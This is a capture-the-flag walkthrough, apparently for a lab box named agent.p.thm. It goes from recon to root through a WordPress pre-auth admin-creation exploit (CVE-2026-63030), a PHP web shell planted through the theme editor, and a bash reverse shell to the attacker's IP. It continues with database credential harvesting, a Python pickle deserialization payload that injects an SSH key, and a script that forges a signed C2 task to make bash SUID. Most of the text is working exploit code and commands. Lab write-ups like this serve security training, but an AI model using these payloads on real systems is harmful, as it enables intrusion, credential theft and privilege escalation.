## Step 0 — Recon

```bash
# Nmap scan
nmap -sC -sV agent.p.thm
# Expect: port 80 (WordPress 6.9), port 22 (SSH pubkey-only)

# Wpscan
wpscan --url http://agent.p.thm --api-token <YOUR_TOKEN> -e vp,vt,u
# Expect: CVE-2026-63030 flagged, user "heinz"
```

---

## Step 1 — Initial Access (WordPress → www-data)

**Get wp2shell.py:**

```bash
git clone https://github.com/mverschu/CVE-2026-63030.git
cd CVE-2026-63030
```

**Verify vulnerability:**

```bash
python3 wp2shell.py check http://agent.p.thm/wp-trackback.php
```

**Create admin (pre-auth):**

```bash
python3 wp2shell.py shell http://agent.p.thm/ -i
```

Output will look like:
```
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_a5fdae0313e0
[+]     email:    wp2_a5fdae0313e0@wp2shell.invalid
[+]     password: Wp2!RCFKphx2aSGoImuyytie
```

**The plugin-upload step will time out** (outbound restrictions on the box). Instead:

1. Log into `http://agent.p.thm/wp-admin` with the generated admin credentials
2. Go to **Appearance → Theme File Editor**
3. Select theme **Twenty Twenty-Five**, file **patterns → contact-info-locations.php**
4. Replace the entire content with:

```php
<?php system($_GET['cmd']); ?>
```

5. Save the file

**Start a listener on Kali:**

```bash
nc -lvnp 4444
```

**Trigger the shell** (in a browser or curl):

```bash
curl 'http://agent.p.thm/wp-content/themes/twentytwentyfive/patterns/contact-info-locations.php?cmd=bash+-i+%3E%26+/dev/tcp/YOUR_KALI_IP/4444+0%3E%261'
```

You should get a shell as `www-data`.

---

## Step 2 — www-data → norm (USER FLAG)

```bash
# On the www-data shell:
cat /var/www/html/wp-config.php | grep DB_
```

Output:
```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'wp_WjURfdI' );
```

```bash
mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SHOW TABLES;"
# Look for: wp_infra_accounts

mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT * FROM wp_infra_accounts;"
```

Output:
```
+-----------+---------------------+-------------------------------------------------+
| host_user | host_pass           | note                                            |
+-----------+---------------------+-------------------------------------------------+
| norm      | N0rm_th3_r0b0t_2026 | ssh sync target for the -inator newsletter cron |
+-----------+---------------------+-------------------------------------------------+
```

```bash
su norm
# password: N0rm_th3_r0b0t_2026

cat /home/norm/user.txt
```

```
# ← USER FLAG is here, copy it
```

---

## Step 3 — norm → vanessa (OPERATOR FLAG)

```bash
# As norm:
id
# uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)

cat /etc/evilinc/panel.conf
```

Output:
```
[panel]
operator_secret = b3hind_sch3dul3_th1s_m0nth
```

**Login to the internal panel:**

```bash
curl -s -c cookies.txt -X POST http://127.0.0.1:8700/api/login \
  -d "secret=b3hind_sch3dul3_th1s_m0nth"
# {"ok":true}
```

**Pickle exploit — create `exploit.py` on Kali (or run inline):**

```python
#!/usr/bin/env python3
import pickle, base64, pydoc

# Replace this with your actual command
cmd = (
    'mkdir -p /home/vanessa/.ssh && '
    'echo "ssh-ed25519 AAAA...YOUR_PUBKEY... hatixntsoa" >> /home/vanessa/.ssh/authorized_keys && '
    'chmod 700 /home/vanessa/.ssh && '
    'chmod 600 /home/vanessa/.ssh/authorized_keys && '
    'chown -R vanessa:vanessa /home/vanessa/.ssh'
)

class GetSystemFunc:
    def __call__(self, *a, **kw):
        pass
    def __reduce__(self):
        return (pydoc.locate, ('os.system',))

class Exploit:
    def __reduce__(self):
        return (GetSystemFunc(), (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

**Generate your SSH key on Kali (if you don't have one):**

```bash
ssh-keygen -t ed25519 -f ~/vanessa_key -N ""
cat ~/vanessa_key.pub
# Copy this public key into exploit.py
```

**Send the payload:**

```bash
# From the norm shell (or via SSH if you have it):
curl -s -b cookies.txt -X POST http://127.0.0.1:8700/api/blueprints/import \
  --data-urlencode "blueprint=$(python3 exploit.py)"
# {"loaded":"0","ok":true}
```

**SSH in as vanessa:**

```bash
# From Kali:
ssh -i ~/vanessa_key vanessa@agent.p.thm
# (or 127.0.0.1 if you're already on the box)

cat /home/vanessa/operator.txt
```

```
# ← OPERATOR FLAG is here, copy it
```

---

## Step 4 — vanessa → root (ROOT FLAG)

```bash
# As vanessa:
ls -la /run/evilinc/tasking.sock
# srw-rw---- 1 root vanessa 0 ... /run/evilinc/tasking.sock

cat /etc/machine-id
# Note this value (e.g. "a1b2c3d4e5f6...")
```

**Create `forge_task.py` on Kali:**

```python
#!/usr/bin/env python3
"""Forge a C2 task to get SUID bash"""
import hmac, hashlib, socket

def keystream(n, seed=0x1a2b3c4d):
    s = seed
    out = bytearray()
    for _ in range(n):
        s = (s * 0x41c64e6d + 0x3039) & 0xFFFFFFFF
        out.append((s >> 16) & 0xFF)
    return bytes(out)

# XOR-obfuscated seed from .rodata at offset 0x2020
cipher = bytes.fromhex(
    "1588c57c026ae5eb9c2d1817af48f709"
    "64efff765e58d112d8f116d70f9941b4"
)
ks = keystream(32)
raw_secret = bytes(a ^ b for a, b in zip(ks, cipher))

# REPLACE with the actual machine-id from the box
machine_id = "PASTE_MACHINE_ID_HERE"

signing_key = hmac.new(raw_secret, machine_id.encode(), hashlib.sha256).digest()

# Forge task
task_id = "9999999"
task_type = "exec"
cmd = "chmod u+s /bin/bash"
nonce = "1"

msg = f"{task_id}|{task_type}|{cmd}|{nonce}"
sig = hmac.new(signing_key, msg.encode(), hashlib.sha256).hexdigest()
submit = f"SUBMIT {task_id}|{task_type}|{cmd}|{nonce}|{sig}"

print(f"[*] Sending: {submit}")

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/evilinc/tasking.sock")
sock.sendall(submit.encode() + b"\n")
resp = sock.recv(64).decode()
print(f"[+] Response: {resp}")
sock.close()
```

**Run it as vanessa** (either copy it over or run it inline):

```bash
# As vanessa on the box:
python3 forge_task.py
# [+] Response: OK
```

**Wait for the implant's 3-second poll cycle, then:**

```bash
sleep 4
/bin/bash -p
cat /root/root.txt
```

```
# ← ROOT FLAG is here, copy it
```

---

## Summary

| Step | Command | Flag Location |
|------|---------|---------------|
| 1 | `wp2shell.py` + Theme File Editor | Shell as `www-data` |
| 2 | `mysql` → `su norm` | `/home/norm/user.txt` |
| 3 | Pickle RCE → SSH key injection | `/home/vanessa/operator.txt` |
| 4 | Forged C2 task → SUID bash | `/root/root.txt` |

**Key resources:**
- `wp2shell.py`: `git clone https://github.com/mverschu/CVE-2026-63030.git`
- No other external tools needed — everything else is `curl`, `mysql`, `python3`, and `ssh`

